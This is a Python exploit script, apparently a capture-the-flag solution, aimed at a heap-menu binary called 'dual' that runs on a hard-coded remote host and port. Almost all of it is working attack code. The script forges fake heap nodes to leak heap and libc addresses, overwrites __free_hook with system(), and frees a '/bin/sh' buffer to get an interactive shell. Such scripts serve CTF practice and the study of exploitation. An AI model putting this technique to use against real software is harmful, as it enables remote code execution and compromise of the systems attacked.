#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'13.231.226.137', 'port':9573})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    dual = Dual(conn)

    dual.write_bin(0)
    n1 = dual.create(0)

    fake_node  = flat(n1, -1)
    fake_node += flat(0, 0, 0)
    fake_node += flat(0, 0)
    fake_node += flat(0)
    dual.write_text(0, fake_node)

    n2 = dual.create(n1)
    leak = dual.read_text(0)
    addr_heap_base = unpack(leak[0x10:0x18]) - 0x11f20
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    addr_heap_root = addr_heap_base + 0x11eb0
    addr_heap_n1   = addr_heap_base + 0x11fb0
    addr_heap_pool = addr_heap_base + 0x12450

    for _ in range(8):
        dual.write_bin(n2, 'X'*(0x88//4*3))
    dual.gc()

    n3 = dual.create(n1)
    dual.write_text(n3, '3'*0x88)

    exploit  = b'/bin/sh'
    exploit  = exploit.ljust(0x88, b'\x00')
    exploit += pack(0x91)
    exploit += flat(addr_heap_root, addr_heap_n1, 0xdeadbeef, addr_heap_pool, addr_heap_base + 0x124d0)
    fake_node  = flat(n1, -1)
    fake_node += flat(0, 0, 0)
    fake_node += flat(len(exploit), 3)
    fake_node += flat(0)
    dual.write_text(0, fake_node)
    dual.write_text(n1, exploit)

    fake_node  = flat(n1, -1)
    fake_node += flat(0, 0, 0)
    fake_node += flat(0x20, 4)              # addr_heap_base + 0x124d0
    fake_node += flat(0)
    dual.write_text(0, fake_node)
    leak = dual.read_text(n1)

    addr_libc_main_arena = unpack(leak[0x10:0x18]) - 0x60
    libc.address = addr_libc_main_arena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    fake_pool  = flat(addr_heap_root, addr_heap_n1, addr_heap_base + 0x123c0, addr_libc_free_hook)
    fake_node  = flat(n1, -1)
    fake_node += flat(0, 0, 0)
    fake_node += flat(len(fake_pool), 3)    # addr_heap_pool & addr_libc_free_hook
    fake_node += flat(0)
    dual.write_text(0, fake_node)
    dual.write_text(n1, fake_pool)
    dual.write_text(n1, pack(addr_libc_system))

    dual.gc()

class Dual:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create(self, pred):
        self.sendlineafter('op>\n', '1')
        self.sendlineafter('pred_id>\n', str(pred))
        return int(self.recvline(keepends=False))

    def connect(self, pred, succ):
        self.sendlineafter('op>\n', '2')
        self.sendlineafter('pred_id>\n', str(pred))
        self.sendlineafter('succ_id>\n', str(succ))

    def disconnect(self, pred, succ):
        self.sendlineafter('op>\n', '3')
        self.sendlineafter('pred_id>\n', str(pred))
        self.sendlineafter('succ_id>\n', str(succ))

    def write_text(self, node, text=''):
        self.sendlineafter('op>\n', '4')
        self.sendlineafter('node_id>\n', str(node))
        self.sendlineafter('text_len>\n', str(len(text)))
        self.sendafter('text>\n', text)

    def write_bin(self, node, data=''):
        self.sendlineafter('op>\n', '5')
        self.sendlineafter('node_id>\n', str(node))
        self.sendlineafter('bin_len>\n', str(len(data)))
        self.sendafter('bin>\n', data)

    def read_text(self, node):
        self.sendlineafter('op>\n', '6')
        self.sendlineafter('node_id>\n', str(node))
        text = self.recvuntil('op>\n', drop=True)
        self.unrecv('op>\n')
        return text

    def gc(self):
        self.sendlineafter('op>\n', '7')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
